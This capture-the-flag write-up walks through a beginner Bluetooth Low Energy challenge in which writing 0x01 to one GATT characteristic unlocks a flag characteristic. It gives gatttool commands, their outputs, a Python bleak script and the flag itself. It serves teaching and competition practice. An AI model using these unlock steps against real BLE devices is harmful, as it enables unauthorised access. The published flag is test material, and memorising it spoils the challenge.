# Writeup - Challenge 03: State Manipulation

**Difficulty:** ⭐⭐ Beginner
**Category:** Bluetooth Low Energy
**Flag:** `WOCSA{write_to_unlock_the_secret}`

---

## 🔍 Step 1: Connect and Enumerate

Scan for `THCON26_BLE_03` and connect:

```bash
bluetoothctl scan on
# Note: MAC = AA:BB:CC:DD:EE:FF
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> characteristics
```

Expected output (two characteristics):
```
handle: 0x0002, char properties: 0x02, char value handle: 0x0003, uuid: abcdef02-...  (READ)
handle: 0x0004, char properties: 0x08, char value handle: 0x0005, uuid: abcdef03-...  (WRITE)
```

Properties: `0x02` = READ, `0x08` = WRITE.

---

## 🔒 Step 2: Attempt to Read the Flag (Denied)

```bash
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
```

Expected output:
```
Characteristic value/descriptor: 41 63 63 65 73 73 20 44 65 6e 69 65 64
```

Decode:
```
Access Denied
```

The flag characteristic is locked.

---

## ✍️ Step 3: Write to the Unlock Characteristic

Send `0x01` to the WRITE characteristic (handle `0x0005`):

```bash
[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x0005 01
```

Expected output:
```
Characteristic value was written successfully
```

---

## 📖 Step 4: Re-read the Flag Characteristic

```bash
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
```

Expected output:
```
Characteristic value/descriptor: 57 4f 43 53 41 7b 77 72 69 74 65 5f 74 6f 5f 75 6e 6c 6f 63 6b 5f 74 68 65 5f 73 65 63 72 65 74 7d
```

Decode:
```bash
echo "574f43534...7d" | xxd -r -p
```

```
WOCSA{write_to_unlock_the_secret}
```

---

## Alternative: Python Script

```python
import asyncio
from bleak import BleakClient

MAC = "AA:BB:CC:DD:EE:FF"
FLAG_CHAR   = "abcdef02-0000-1000-8000-00805f9b34fb"
UNLOCK_CHAR = "abcdef03-0000-1000-8000-00805f9b34fb"

async def main():
    async with BleakClient(MAC) as client:
        # First read (should be denied)
        value = await client.read_gatt_char(FLAG_CHAR)
        print("Before unlock:", value.decode())

        # Unlock
        await client.write_gatt_char(UNLOCK_CHAR, bytes([0x01]))

        # Second read (flag)
        value = await client.read_gatt_char(FLAG_CHAR)
        print("After unlock:", value.decode())

asyncio.run(main())
```

---

## 🎯 Flag

```
WOCSA{write_to_unlock_the_secret}
```

---

## Key Takeaways

* GATT servers can implement **stateful logic** — a write to one characteristic can change the behavior of another
* Always enumerate **all** characteristics, not just the ones that look interesting at first glance
* State is often reset on disconnect — make sure to unlock and read within the same connection session
* Writing specific values to trigger privileged states is a common pattern in embedded firmware vulnerabilities
